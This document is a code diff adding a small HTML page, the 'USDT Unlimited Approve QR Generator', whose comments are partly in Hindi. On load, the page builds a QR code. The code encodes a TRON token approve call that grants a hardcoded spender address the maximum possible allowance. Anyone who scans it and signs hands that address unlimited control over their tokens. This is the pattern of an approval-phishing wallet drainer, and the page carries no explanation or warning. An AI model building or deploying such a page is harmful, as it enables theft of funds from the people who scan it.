@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>USDT Unlimited Approve QR Generator</title>
+  <!-- ✅ Stable QRCode library -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; }
+    #qrcode { margin-top: 30px; }
+    input { padding: 8px; margin: 5px; width: 320px; text-align: center; }
+  </style>
+</head>
+<body>
+  <h2>🔐 USDT Unlimited Approve QR Generator</h2>
+
+  <p>Contract Address:</p>
+  <input id="contract" value="TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" readonly />
+
+  <p>Spender Address:</p>
+  <input id="spender" value="THN9TLyQ1qjXvhvwSoneYwz88yTgnr9Zx4" readonly />
+
+  <p>Amount (Unlimited):</p>
+  <input id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" readonly />
+
+  <!-- ✅ यहाँ QR दिखाई देगा -->
+  <div id="qrcode"></div>
+
+  <script>
+    function generateQR() {
+      const contract = document.getElementById("contract").value.trim();
+      const spender = document.getElementById("spender").value.trim();
+      const amount = document.getElementById("amount").value.trim();
+
+      const data = `tron:${contract}?function=approve&spender=${spender}&value=${amount}`;
+
+      const qrContainer = document.getElementById("qrcode");
+      qrContainer.innerHTML = ""; // पहले साफ करो
+
+      new QRCode(qrContainer, {
+        text: data,
+        width: 250,
+        height: 250
+      });
+    }
+
+    // ✅ Page load होते ही QR auto-generate हो जाएगा
+    window.onload = generateQR;
+  </script>
+</body>
+</html>
